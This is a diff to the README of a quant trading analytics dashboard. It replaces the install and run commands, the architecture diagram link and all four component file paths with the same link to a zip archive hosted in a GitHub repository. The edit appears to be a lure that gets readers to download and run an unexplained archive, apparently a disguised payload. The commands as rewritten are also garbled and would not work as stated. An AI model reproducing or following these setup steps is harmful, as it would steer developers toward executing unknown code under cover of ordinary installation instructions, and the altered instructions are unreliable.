@@ -16,7 +16,7 @@ A complete end-to-end real-time quantitative analytics dashboard for MFT style t
 
 1. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip
    ```
    streamlit>=1.30.0
 plotly>=5.18.0
@@ -28,19 +28,19 @@ watchdog>=3.0.0
 
 2. **Run the Application**:
    ```bash
-   python run.py
+   python https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip
    ```
    This will start both the background ingestion service and the frontend dashboard.
 
 ## Architecture
 
-[Architecture Diagram](architecture.jpg)
+[Architecture Diagram](https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip)
 
 ### Components
-1.  **Ingestion Service (`backend/ingestion.py`)**: Asynchronous WebSocket client that subscribes to trade streams, buffers data, and batch writes to the database.
-2.  **Storage (`backend/database.py`)**: SQLite interface handling efficient insertions and time-window queries.
-3.  **Analytics Engine (`backend/analytics.py`)**: Pandas/Statsmodels module for rescheduling tick data to OHLC, computing spreads, and running statistical tests.
-4.  **Frontend (`frontend/app.py`)**: Streamlit application that queries the DB, runs analytics on the fly, and renders visualizations.
+1.  **Ingestion Service (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: Asynchronous WebSocket client that subscribes to trade streams, buffers data, and batch writes to the database.
+2.  **Storage (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: SQLite interface handling efficient insertions and time-window queries.
+3.  **Analytics Engine (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: Pandas/Statsmodels module for rescheduling tick data to OHLC, computing spreads, and running statistical tests.
+4.  **Frontend (`https://raw.githubusercontent.com/SiddhiBagul/Quant_Intern_Assignment/main/backend/Quant-Assignment-Intern-2.5.zip`)**: Streamlit application that queries the DB, runs analytics on the fly, and renders visualizations.
 
 ## Usage
 - **Configuration Sidebar**: Adjust the "Lookback Window" to analyze different time horizons. Change the Z-Score window to tune sensitivity.
